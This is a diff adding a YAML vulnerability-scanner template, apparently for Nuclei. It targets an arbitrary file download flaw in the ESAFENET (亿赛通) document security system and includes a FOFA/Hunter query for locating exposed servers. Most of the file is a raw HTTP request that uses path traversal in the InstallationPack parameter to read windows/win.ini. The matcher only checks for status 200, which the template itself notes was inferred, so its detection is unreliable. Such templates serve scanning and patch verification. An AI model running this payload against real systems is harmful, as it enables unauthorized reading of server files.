@@ -1,0 +1,36 @@
+id: poc-9e0dfbc6b5887e5a51a7
+info:
+  name: 亿赛通电子文档安全管理系统ClientAjax任意文件下载
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/9e0dfbc6b5887e5a51a75e4091ad4ce4
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 9e0dfbc6b5887e5a51a75e4091ad4ce4
+    fofa: + hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+http:
+- raw:
+  - 'POST /CDGServer3/ClientAjax HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Content-type: application/x-www-form-urlencoded
+
+    Content-Length: 102
+
+    Connection: close
+
+
+    command=downclientpak&InstallationPack=../../../../../../../../../../windows/win.ini&forward=index.jsp'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
